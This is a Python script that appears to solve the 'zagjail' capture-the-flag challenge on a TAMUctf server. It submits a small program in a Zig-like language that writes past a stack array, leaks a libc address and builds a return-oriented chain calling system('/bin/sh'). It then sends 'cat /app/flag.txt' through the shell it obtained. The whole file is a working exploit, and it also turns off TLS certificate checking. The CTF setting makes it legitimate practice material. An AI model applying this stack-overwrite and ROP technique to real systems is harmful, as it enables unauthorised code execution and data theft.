#!/usr/bin/env python3
import socket
import ssl
import sys

HOST = 'streams.tamuctf.com'
PORT = 443
SNI = 'zagjail'

SRC = r'''fn main() u32 {
    var arr: [4]u64;
    var rip = *((&arr)+5);
    var libc = rip - 171176;
    var pop_rdi = libc + 172357;
    var ret = libc + 171607;
    var binsh = libc + 1728164;
    var system = libc + 340240;
    *((&arr)+5) = pop_rdi;
    *((&arr)+6) = binsh;
    *((&arr)+7) = ret;
    *((&arr)+8) = system;
    return 0;
}
'''

def recv_some(sock: ssl.SSLSocket, timeout: float = 0.5) -> bytes:
    sock.settimeout(timeout)
    out = bytearray()
    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        out += chunk
        if len(chunk) < 4096:
            break
    return bytes(out)


def main() -> int:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    with socket.create_connection((HOST, PORT)) as raw:
        with ctx.wrap_socket(raw, server_hostname=SNI) as sock:
            banner = recv_some(sock, timeout=1.0)
            if banner:
                sys.stdout.buffer.write(banner)
                sys.stdout.flush()

            payload = SRC + '<EOF>\n'
            sock.sendall(payload.encode())

            # Let the process compile and pivot into /bin/sh via system("/bin/sh").
            # Then ask for the flag and terminate the shell.
            data = recv_some(sock, timeout=1.0)
            if data:
                sys.stdout.buffer.write(data)
                sys.stdout.flush()

            sock.sendall(b'cat /app/flag.txt\nexit\n')

            while True:
                chunk = recv_some(sock, timeout=1.0)
                if not chunk:
                    break
                sys.stdout.buffer.write(chunk)
                sys.stdout.flush()
    return 0


if __name__ == '__main__':
    raise SystemExit(main())